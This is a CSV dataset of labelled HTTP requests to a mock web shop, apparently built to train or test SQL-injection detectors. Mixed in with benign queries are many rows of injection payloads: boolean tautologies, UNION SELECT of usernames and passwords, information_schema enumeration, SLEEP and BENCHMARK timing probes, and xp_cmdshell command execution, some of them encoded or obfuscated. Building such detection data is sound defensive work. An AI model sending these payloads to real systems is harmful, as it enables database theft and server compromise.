timestamp,source_ip,method,url,params,body,headers,raw_query,is_malicious,attack_type,insertion_point,mutation_type,orig_payload_id,difficulty_score,source_file,Query,Label,Attack_Type,query_hash
2025-02-21T14:30:41Z,10.245.XXX.XXX,POST,/comment,,username=57&comment=Bike,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=57&comment=Bike",0.0,,,,,0.0,dataset.csv,,,,be1221980bfe304df776f2565a015f0a
2025-02-18T13:10:35Z,10.98.XXX.XXX,POST,/comment,,username=watch 2025&comment=sofa price,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=watch 2025&comment=sofa price",0.0,,,,,0.0,dataset.csv,,,,f206c16c4c5997d50a61bff02c9b4dd5
2025-07-29T20:17:32Z,10.113.XXX.XXX,POST,/api/filter,,"{{""filters"":{{""category"":""books"",""min_price"":968}}}}","{""Content-Type"": ""application/json""}","POST /api/filter HTTP/1.1
Content-Type: application/json

{{""filters"":{{""category"":""books"",""min_price"":968}}}}",0.0,,,,,0.0,dataset.csv,,,,df7971ac41b97ed4b139c7bcd93f4912
2025-08-02T08:43:46Z,192.168.XXX.XXX,POST,/comment,,username=%2527%253b%2520%2544%2552%254f%2550%2520%2554%2541%2542%254c%2545%2520%2575%2573%2565%2572%2573%252d%252d&comment=hat price,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=%2527%253b%2520%2544%2552%254f%2550%2520%2554%2541%2542%254c%2545%2520%2575%2573%2565%2572%2573%252d%252d&comment=hat price",1.0,stacked,body_form,comment_insert,p0087,0.7,dataset.csv,,,,f7d214aa796843ff66a0dbce5853c02f
2025-10-25T23:59:08Z,10.10.XXX.XXX,GET,/search,"{""q"": ""%27%3b%20%45%58%45%43%20%73%70%5f%63%6f%6e%66%69%67%75%72%65%20%27%73%68%6f%77%20%61%64%76%61%6e%63%65%64%20%6f%70%74%69%6f%6e%73%27%2c%31%2d%2d""}",,,GET /search?q=%27%3b%20%45%58%45%43%20%73%70%5f%63%6f%6e%66%69%67%75%72%65%20%27%73%68%6f%77%20%61%64%76%61%6e%63%65%64%20%6f%70%74%69%6f%6e%73%27%2c%31%2d%2d HTTP/1.1,1.0,stacked,query_param,url_encode,p0091,0.6000000000000001,dataset.csv,,,,9f16d1c1f4970ad8215a692cc08cbe44
2025-04-26T11:41:19Z,192.168.XXX.XXX,GET,/search,"{""q"": ""%27%3b%20%45%58%45%43%20%73%70%5f%63%6f%6e%66%69%67%75%72%65%20%27%73%68%6f%77%20%61%64%76%61%6e%63%65%64%20%6f%70%74%69%6f%6e%73%27%2c%31%2d%2d""}",,,GET /search?q=%27%3b%20%45%58%45%43%20%73%70%5f%63%6f%6e%66%69%67%75%72%65%20%27%73%68%6f%77%20%61%64%76%61%6e%63%65%64%20%6f%70%74%69%6f%6e%73%27%2c%31%2d%2d HTTP/1.1,1.0,stacked,query_param,hex,p0091,1.0,dataset.csv,,,,9f16d1c1f4970ad8215a692cc08cbe44
2025-09-01T17:59:55Z,10.249.XXX.XXX,POST,/api/search,,"{{""user"":""python tutorial"",""query"":""JyBBTkQgRVhJU1RTKFNFTEVDVCAqIEZST00gdXNlcnMgV0hFUkUgdXNlcm5hbWU9J2FkbWluJyktLQ==%00""}}","{""Content-Type"": ""application/json""}","POST /api/search HTTP/1.1
Content-Type: application/json

{{""user"":""python tutorial"",""query"":""JyBBTkQgRVhJU1RTKFNFTEVDVCAqIEZST00gdXNlcnMgV0hFUkUgdXNlcm5hbWU9J2FkbWluJyktLQ==%00""}}",1.0,blind,body_json,hex,p0103,1.0,dataset.csv,,,,0b92b78d68adb521e29e46472537cf6d
2025-06-14T10:54:40Z,10.234.XXX.XXX,POST,/api/filter,,"{{""filters"":{{""category"":""books"",""min_price"":172}}}}","{""Content-Type"": ""application/json""}","POST /api/filter HTTP/1.1
Content-Type: application/json

{{""filters"":{{""category"":""books"",""min_price"":172}}}}",0.0,,,,,0.0,dataset.csv,,,,5bf3885fb5ae9e8683a4a298563acf80
2025-05-18T18:11:56Z,10.133.XXX.XXX,POST,/api/search,,"{{""user"":""camera"",""query"":""scooter price""}}","{""Content-Type"": ""application/json""}","POST /api/search HTTP/1.1
Content-Type: application/json

{{""user"":""camera"",""query"":""scooter price""}}",0.0,,,,,0.0,dataset.csv,,,,c9e86efa4d1f2a13f7c40ede0a22f9fc
2025-09-15T19:15:32Z,10.122.XXX.XXX,POST,/comment,,username=9&comment=shirt review,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=9&comment=shirt review",0.0,,,,,0.0,dataset.csv,,,,0605d920e7d536fb4d769c19d00b2935
2025-08-08T04:02:40Z,10.93.XXX.XXX,POST,/api/search,,"{{""user"":""travel destinations"",""query"":""best python tutorial""}}","{""Content-Type"": ""application/json""}","POST /api/search HTTP/1.1
Content-Type: application/json

{{""user"":""travel destinations"",""query"":""best python tutorial""}}",0.0,,,,,0.0,dataset.csv,,,,7362ff00330d590c4eae1ba63afd91bc
2025-06-17T08:31:28Z,10.70.XXX.XXX,POST,/comment,,username=bike price&comment=best machine learning,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=bike price&comment=best machine learning",0.0,,,,,0.0,dataset.csv,,,,d6b01c1e380ed0a592e12ccb63311aa6
2025-03-21T13:01:06Z,10.0.XXX.XXX,POST,/comment,,username=PANTS&comment=watch price,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=PANTS&comment=watch price",0.0,,,,,0.0,dataset.csv,,,,0c6accf23b9baae81ec8177742b24dc3
2025-02-14T08:13:23Z,192.168.XXX.XXX,GET,/product,"{""id"": ""best hat"", ""ref"": ""' AND (SELECT * FROM (SELECT(SLEEP(0)))a)#""}",,,GET /product?id=best hat&ref=' AND (SELECT * FROM (SELECT(SLEEP(0)))a)# HTTP/1.1,1.0,error,query_param,none,p0063,0.2,dataset.csv,,,,2842eacc3e3f378d32715c51473d6b0b
2025-10-19T13:46:07Z,10.4.XXX.XXX,GET,/item/8410/details,,,,GET /item/8410/details HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,eb81e83819e862460f19c9d1a2fba67e
2025-06-16T00:18:06Z,10.117.XXX.XXX,GET,/item,"{""id"": ""1'+Or+'1'='1'+LIMIT+1--""}",,,GET /item?id=1'+Or+'1'='1'+LIMIT+1-- HTTP/1.1,1.0,boolean,query_param,hex,p0160,1.0,dataset.csv,,,,bdfda2406f1ca17f5713dcde46351db1
2025-01-30T16:15:57Z,10.89.XXX.XXX,GET,/product,"{""id"": ""88"", ""ref"": ""best movie""}",,,GET /product?id=88&ref=best movie HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,8a580caed3b2ba1f3a6b339b7c76ffaa
2025-08-06T08:36:33Z,10.0.XXX.XXX,GET,/product,"{""id"": ""DESK"", ""ref"": ""70""}",,,GET /product?id=DESK&ref=70 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,4d72e59e1e9d73753f0e0cd5e5db959f
2025-06-22T17:54:43Z,10.131.XXX.XXX,POST,/api/filter,,"{{""filters"":{{""category"":""books"",""min_price"":423}}}}","{""Content-Type"": ""application/json""}","POST /api/filter HTTP/1.1
Content-Type: application/json

{{""filters"":{{""category"":""books"",""min_price"":423}}}}",0.0,,,,,0.0,dataset.csv,,,,21b3942cdf77f9cb162b53c57684352a
2025-07-12T20:18:00Z,10.99.XXX.XXX,POST,/comment,,username=8&comment=50,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=8&comment=50",0.0,,,,,0.0,dataset.csv,,,,4d6d5e091dff3bbeb15f97dabfa56f63
2025-09-13T06:21:23Z,10.241.XXX.XXX,GET,/product,"{""id"": ""7"", ""ref"": ""music review""}",,,GET /product?id=7&ref=music review HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,17abd9f13b90e9700181567f6a96dae2
2025-03-25T20:32:08Z,10.149.XXX.XXX,POST,/api/filter,,"{{""filters"":{{""category"":""electronics"",""min_price"":917}}}}","{""Content-Type"": ""application/json""}","POST /api/filter HTTP/1.1
Content-Type: application/json

{{""filters"":{{""category"":""electronics"",""min_price"":917}}}}",0.0,,,,,0.0,dataset.csv,,,,17b3be0482a0cd52394a14465c510efd
2025-10-09T18:02:52Z,10.116.XXX.XXX,POST,/api/filter,,"{{""filters"":{{""category"":""'\nOR\n1=1/*%00"",""min_price"":136}}}}","{""Content-Type"": ""application/json""}","POST /api/filter HTTP/1.1
Content-Type: application/json

{{""filters"":{{""category"":""'\nOR\n1=1/*%00"",""min_price"":136}}}}",1.0,boolean,body_json,base64,p0174,1.0,dataset.csv,,,,4fbb8b37365b1ca4d82eeae89a51832f
2025-03-20T17:39:35Z,10.237.XXX.XXX,POST,/comment,,username=WEB DEVELOPMENT&comment=phone review,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=WEB DEVELOPMENT&comment=phone review",0.0,,,,,0.0,dataset.csv,,,,efe53da5d35140b7c2efc8efa4a78372
2025-10-04T04:55:15Z,10.68.XXX.XXX,GET,/item/6491/details,,,,GET /item/6491/details HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,e373229875232260cd7a6fdba7300e45
2025-10-18T12:05:38Z,10.89.XXX.XXX,POST,/api/search,,"{{""user"":""52"",""query"":""((';	EXEC	master..xp_cmdshell	'whoami'--))""}}","{""Content-Type"": ""application/json""}","POST /api/search HTTP/1.1
Content-Type: application/json

{{""user"":""52"",""query"":""((';	EXEC	master..xp_cmdshell	'whoami'--))""}}",1.0,stacked,body_json,whitespace_obf,p0152,0.7,dataset.csv,,,,e8149b7100f3679db502e99ac65e8619
2025-09-24T04:44:33Z,192.168.XXX.XXX,POST,/api/search,,"{{""user"":""Helmet"",""query"":""MScgT1IgQkVOQ0hNQVJLKDUwMDAwMDAsTUQ1KCdBJykpLS0=%00""}}","{""Content-Type"": ""application/json""}","POST /api/search HTTP/1.1
Content-Type: application/json

{{""user"":""Helmet"",""query"":""MScgT1IgQkVOQ0hNQVJLKDUwMDAwMDAsTUQ1KCdBJykpLS0=%00""}}",1.0,time-based,body_json,base64,p0076,1.0,dataset.csv,,,,1ddd715773f843463c513b33c8ff5d3d
2025-10-23T07:59:53Z,10.129.XXX.XXX,POST,/api/search,,"{{""user"":""HEALTHY RECIPES"",""query"":""43""}}","{""Content-Type"": ""application/json""}","POST /api/search HTTP/1.1
Content-Type: application/json

{{""user"":""HEALTHY RECIPES"",""query"":""43""}}",0.0,,,,,0.0,dataset.csv,,,,b58dae5ed86f029ee110c2bff3347671
2025-09-29T08:04:14Z,10.74.XXX.XXX,POST,/comment,,username=6&comment=SCOOTER,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=6&comment=SCOOTER",0.0,,,,,0.0,dataset.csv,,,,49aa725cc5bc45892836ceac0ad39451
2025-09-09T15:27:49Z,10.150.XXX.XXX,POST,/comment,,username=hotel booking&comment=44,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=hotel booking&comment=44",0.0,,,,,0.0,dataset.csv,,,,0820cd78fe51d05129529331d0c4f2c6
2025-04-28T00:06:12Z,10.227.XXX.XXX,POST,/comment,,username=59&comment=%27%2BUNION%2BSELECT%2Busername%2Cpassword%2BFROM%2Busers%23,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=59&comment=%27%2BUNION%2BSELECT%2Busername%2Cpassword%2BFROM%2Busers%23",1.0,union,body_form,whitespace_obf,p0044,0.6000000000000001,dataset.csv,,,,ae8267e9cf81062cb25c2f646ff1557a
2025-06-23T17:18:19Z,10.252.XXX.XXX,GET,/search,"{""q"": ""KCc7IEVYRUMgc3BfY29uZmlndXJlICdzaG93IGFkdmFuY2VkIG9wdGlvbnMnLDEtLSk=%00""}",,,GET /search?q=KCc7IEVYRUMgc3BfY29uZmlndXJlICdzaG93IGFkdmFuY2VkIG9wdGlvbnMnLDEtLSk=%00 HTTP/1.1,1.0,stacked,query_param,url_encode,p0145,0.4,dataset.csv,,,,fc76ca9c9e8b67af5ab0ac845db1a4e3
2025-02-07T15:56:36Z,10.116.XXX.XXX,POST,/comment,,username=Battery&comment=%27%3B+SeLeCt+pg_sleep%285%29%23,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=Battery&comment=%27%3B+SeLeCt+pg_sleep%285%29%23",1.0,time-based,body_form,none,p0079,0.3,dataset.csv,,,,0efaac9cb13718e9b6bd4c90ddbfc172
2025-06-09T05:46:01Z,10.56.XXX.XXX,POST,/api/search,,"{{""user"":""71"",""query"":""Sofa""}}","{""Content-Type"": ""application/json""}","POST /api/search HTTP/1.1
Content-Type: application/json

{{""user"":""71"",""query"":""Sofa""}}",0.0,,,,,0.0,dataset.csv,,,,227d8bc2964f29cfa4253a8587d79a04
2025-03-22T14:47:22Z,10.150.XXX.XXX,POST,/api/filter,,"{{""filters"":{{""category"":""books"",""min_price"":289}}}}","{""Content-Type"": ""application/json""}","POST /api/filter HTTP/1.1
Content-Type: application/json

{{""filters"":{{""category"":""books"",""min_price"":289}}}}",0.0,,,,,0.0,dataset.csv,,,,7f432f0f18a46cd8e33fadda301673e1
2025-01-24T06:14:39Z,10.220.XXX.XXX,GET,/item,"{""id"": ""1 '\tOr\t'x'='x""}",,,GET /item?id=1 '	Or	'x'='x HTTP/1.1,1.0,boolean,query_param,url_encode,p0009,0.4,dataset.csv,,,,9d999422185069c5064e8846cc4a3dfd
2025-08-10T12:34:49Z,10.232.XXX.XXX,GET,/search,"{""q"": ""'\nOr\n'a'='a""}",,,"GET /search?q='
Or
'a'='a HTTP/1.1",1.0,boolean,query_param,url_encode,p0188,0.4,dataset.csv,,,,17a6e066ac71a86ab571b52dc7f70959
2025-03-09T02:31:22Z,10.96.XXX.XXX,POST,/comment,,username=76&comment=Music,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=76&comment=Music",0.0,,,,,0.0,dataset.csv,,,,5d8b393895882107a75051bafcb9c07f
2025-01-14T13:37:12Z,10.22.XXX.XXX,GET,/product,"{""id"": ""13"", ""ref"": ""76""}",,,GET /product?id=13&ref=76 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,987756b3e32c03544cb45f56100de41a
2025-08-21T16:40:17Z,10.26.XXX.XXX,GET,/item,"{""id"": ""Game""}",,,GET /item?id=Game HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,3ac3ba1f4e9bdba7fa6b7c28872d758f
2025-08-24T04:26:59Z,10.11.XXX.XXX,GET,/item,"{""id"": ""Game""}",,,GET /item?id=Game HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,3ac3ba1f4e9bdba7fa6b7c28872d758f
2025-09-17T11:24:16Z,10.89.XXX.XXX,POST,/api/filter,,"{{""filters"":{{""category"":""clothing"",""min_price"":1000}}}}","{""Content-Type"": ""application/json""}","POST /api/filter HTTP/1.1
Content-Type: application/json

{{""filters"":{{""category"":""clothing"",""min_price"":1000}}}}",0.0,,,,,0.0,dataset.csv,,,,04194992b2e8738e3245fc8bfb75e3f7
2025-04-29T12:46:49Z,10.102.XXX.XXX,GET,/item/%29%2BOr%2B%28%271%27%3D%271/details,,,,GET /item/%29%2BOr%2B%28%271%27%3D%271/details HTTP/1.1,1.0,boolean,path,comment_insert,p0021,0.9,dataset.csv,,,,dc3cf30f0bae0ec63121c8589c3ec2aa
2025-10-07T13:34:45Z,10.21.XXX.XXX,POST,/comment,,username=Mysql database&comment=%27+Or+a%3Da--,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=Mysql database&comment=%27+Or+a%3Da--",1.0,boolean,body_form,none,p0026,0.3,dataset.csv,,,,0328d6fe45bc8d3f635a47e847a965fa
2025-05-07T17:30:18Z,10.199.XXX.XXX,GET,/search,"{""q"": ""YWRtaW4nIE9SICcxJz0nMSctLQ==%00%00""}",,,GET /search?q=YWRtaW4nIE9SICcxJz0nMSctLQ==%00%00 HTTP/1.1,1.0,boolean,query_param,url_encode,p0007,0.4,dataset.csv,,,,b976439439b2501f6f69898b32a6171e
2025-01-23T06:49:53Z,10.232.XXX.XXX,GET,/product,"{""id"": ""shelf"", ""ref"": ""jacket review""}",,,GET /product?id=shelf&ref=jacket review HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,1ebfdfce383d0d4a5a18ca774e1c02bd
2025-02-06T10:44:08Z,10.74.XXX.XXX,GET,/product,"{""id"": ""hat"", ""ref"": ""best camera""}",,,GET /product?id=hat&ref=best camera HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,d1086c9051ac0a78e4ba77b047cb0987
2025-09-24T11:00:02Z,10.114.XXX.XXX,GET,/search,"{""q"": ""1%2527%2520Or%25201%253D1--""}",,,GET /search?q=1%2527%2520Or%25201%253D1-- HTTP/1.1,1.0,boolean,query_param,url_encode,p0013,0.4,dataset.csv,,,,b2d2adc80836283c8631faaea2d38e9f
2025-03-01T06:58:15Z,10.107.XXX.XXX,POST,/comment,,username=BIKE&comment=sofa price,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=BIKE&comment=sofa price",0.0,,,,,0.0,dataset.csv,,,,3eac5b23cb9031acdec1eb044390627d
2025-01-22T15:13:31Z,10.188.XXX.XXX,GET,/product,"{""id"": ""shirt review"", ""ref"": ""73""}",,,GET /product?id=shirt review&ref=73 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,518de00d704eb0dd7e215bc2843f2c12
2025-04-07T11:15:49Z,10.115.XXX.XXX,GET,/product,"{""id"": ""Great product!"", ""ref"": ""(' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--)%00""}",,,GET /product?id=Great product!&ref=(' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--)%00 HTTP/1.1,1.0,time-based,query_param,none,p0166,0.2,dataset.csv,,,,968f9f82282e302595a4a873d0ce58e0
2025-03-28T08:06:49Z,10.31.XXX.XXX,GET,/product,"{""id"": ""book price"", ""ref"": ""54""}",,,GET /product?id=book price&ref=54 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,73cdd93bc5cb5f03d921f8ad55981869
2025-09-12T13:08:10Z,10.160.XXX.XXX,GET,/product,"{""id"": ""best phone"", ""ref"": ""best hat""}",,,GET /product?id=best phone&ref=best hat HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,1438b7c16106ae0f79224e5ffe470e94
2025-08-25T10:47:52Z,10.98.XXX.XXX,GET,/product,"{""id"": ""75"", ""ref"": ""FITNESS TIPS""}",,,GET /product?id=75&ref=FITNESS TIPS HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,f134d633c74ba363231086b23720fa05
2025-04-26T20:07:05Z,10.250.XXX.XXX,GET,/product,"{""id"": ""22"", ""ref"": ""laptop""}",,,GET /product?id=22&ref=laptop HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,3df3aa0f49b0a4a1163d1385a7da22ae
2025-08-17T06:34:27Z,10.194.XXX.XXX,GET,/product,"{""id"": ""16"", ""ref"": ""Javascript guide""}",,,GET /product?id=16&ref=Javascript guide HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,6997b7461c54a5a7a6ebf41cec4e26c5
2025-01-27T16:26:41Z,10.1.XXX.XXX,GET,/search,"{""q"": ""'/**/UnIoN/**/SeLeCt/**/1,2,group_concat(table_name)/**/FROM/**/information_schema.tables--""}",,,"GET /search?q='/**/UnIoN/**/SeLeCt/**/1,2,group_concat(table_name)/**/FROM/**/information_schema.tables-- HTTP/1.1",1.0,union,query_param,none,p0049,0.3,dataset.csv,,,,d0149e5057235b897d2b9b4994ab7a6d
2025-03-17T15:39:59Z,10.41.XXX.XXX,GET,/product,"{""id"": ""JyBVTklPTiBBTEwgU0VMRUNUIE5VTEwsTlVMTC0t"", ""ref"": ""table review""}",,,GET /product?id=JyBVTklPTiBBTEwgU0VMRUNUIE5VTEwsTlVMTC0t&ref=table review HTTP/1.1,1.0,union,query_param,url_encode,p0041,0.4,dataset.csv,,,,5f4b7be5aac7a43dd94b97520c136559
2025-02-05T03:57:17Z,10.99.XXX.XXX,POST,/comment,,username=27&comment=shirt review,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=27&comment=shirt review",0.0,,,,,0.0,dataset.csv,,,,3361196ebc033f2a880069dc37d06fff
2025-06-20T10:59:31Z,10.18.XXX.XXX,GET,/product,"{""id"": ""python tutorial"", ""ref"": ""best web development""}",,,GET /product?id=python tutorial&ref=best web development HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,a0649eaca0c843b4702de12130ab94a5
2025-09-09T02:28:31Z,10.12.XXX.XXX,POST,/api/search,,"{{""user"":""37"",""query"":""54""}}","{""Content-Type"": ""application/json""}","POST /api/search HTTP/1.1
Content-Type: application/json

{{""user"":""37"",""query"":""54""}}",0.0,,,,,0.0,dataset.csv,,,,5e7f81419c4fe28002cfe4c8b87c9125
2025-05-16T16:24:59Z,10.215.XXX.XXX,GET,/product,"{""id"": ""Mysql database"", ""ref"": ""best lamp""}",,,GET /product?id=Mysql database&ref=best lamp HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,0b42538c9c339442c4ef048746ca2dc2
2025-08-12T20:58:00Z,10.197.XXX.XXX,GET,/item/5922/details,,,,GET /item/5922/details HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,b31b0f1f32734f02da8441d384b39e16
2025-08-06T02:44:11Z,10.68.XXX.XXX,POST,/comment,,username=healthy recipes&comment=%27%2F%2A%2A%2FOR%2F%2A%2A%2F%271%27%2F%2A%2A%2FLIKE%2F%2A%2A%2F%271%2500,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=healthy recipes&comment=%27%2F%2A%2A%2FOR%2F%2A%2A%2F%271%27%2F%2A%2A%2FLIKE%2F%2A%2A%2F%271%2500",1.0,boolean,body_form,none,p0133,0.4,dataset.csv,,,,11513a1960b079b3245bef08a71f48c2
2025-09-15T08:21:19Z,10.68.XXX.XXX,POST,/api/search,,"{{""user"":""game review"",""query"":""laptop""}}","{""Content-Type"": ""application/json""}","POST /api/search HTTP/1.1
Content-Type: application/json

{{""user"":""game review"",""query"":""laptop""}}",0.0,,,,,0.0,dataset.csv,,,,4595e508ff255b0212bd906ff4e3a475
2025-06-03T11:01:24Z,10.68.XXX.XXX,POST,/api/filter,,"{{""filters"":{{""category"":""clothing"",""min_price"":195}}}}","{""Content-Type"": ""application/json""}","POST /api/filter HTTP/1.1
Content-Type: application/json

{{""filters"":{{""category"":""clothing"",""min_price"":195}}}}",0.0,,,,,0.0,dataset.csv,,,,925f4b980e8f774f6363600e814963df
2025-10-24T01:38:43Z,10.48.XXX.XXX,GET,/item,"{""id"": ""1'\tOr\t'1'='1'\tLIMIT\t1--""}",,,GET /item?id=1'	Or	'1'='1'	LIMIT	1-- HTTP/1.1,1.0,boolean,query_param,case_obf,p0160,0.5,dataset.csv,,,,0a34769fdea3dba71e111f323c482285
2025-07-29T12:32:37Z,10.222.XXX.XXX,GET,/product,"{""id"": ""23"", ""ref"": ""53""}",,,GET /product?id=23&ref=53 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,adbe8dd320d0d708c0d3e1db8b1910e7
2025-03-08T11:26:52Z,10.2.XXX.XXX,POST,/api/search,,"{{""user"":""12"",""query"":""Flight tickets""}}","{""Content-Type"": ""application/json""}","POST /api/search HTTP/1.1
Content-Type: application/json

{{""user"":""12"",""query"":""Flight tickets""}}",0.0,,,,,0.0,dataset.csv,,,,4491a60fccae3979e1cb9ccd25b08f1e
2025-04-23T02:20:15Z,10.19.XXX.XXX,POST,/api/filter,,"{{""filters"":{{""category"":""'/**/UNION/**/ALL/**/SELECT/**/NULL,NULL#"",""min_price"":101}}}}","{""Content-Type"": ""application/json""}","POST /api/filter HTTP/1.1
Content-Type: application/json

{{""filters"":{{""category"":""'/**/UNION/**/ALL/**/SELECT/**/NULL,NULL#"",""min_price"":101}}}}",1.0,union,body_json,none,p0041,0.5,dataset.csv,,,,465fc0028fc36435ee169c5a791c330d
2025-08-05T03:15:57Z,10.141.XXX.XXX,GET,/item,"{""id"": ""95""}",,,GET /item?id=95 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,119be226a07d00fdc85f658bb3f0c8b7
2025-01-28T09:33:49Z,10.110.XXX.XXX,GET,/item,"{""id"": ""95""}",,,GET /item?id=95 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,119be226a07d00fdc85f658bb3f0c8b7
2025-10-04T12:51:17Z,10.136.XXX.XXX,POST,/comment,,username=TIRE&comment=web development review,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=TIRE&comment=web development review",0.0,,,,,0.0,dataset.csv,,,,5ca27cba421c3d47423e1aa32ca7c344
2025-09-09T19:49:36Z,10.107.XXX.XXX,POST,/api/search,,"{{""user"":""sofa price"",""query"":""camera 2025""}}","{""Content-Type"": ""application/json""}","POST /api/search HTTP/1.1
Content-Type: application/json

{{""user"":""sofa price"",""query"":""camera 2025""}}",0.0,,,,,0.0,dataset.csv,,,,7631684a10b713a89abd5bce3b4bb618
2025-04-01T16:38:40Z,10.23.XXX.XXX,GET,/search,"{""q"": ""1'/**/AND/**/1=1--%00%00""}",,,GET /search?q=1'/**/AND/**/1=1--%00%00 HTTP/1.1,1.0,boolean,query_param,none,p0020,0.2,dataset.csv,,,,c4e2ff0e3686cf1f5d28a54813d0e330
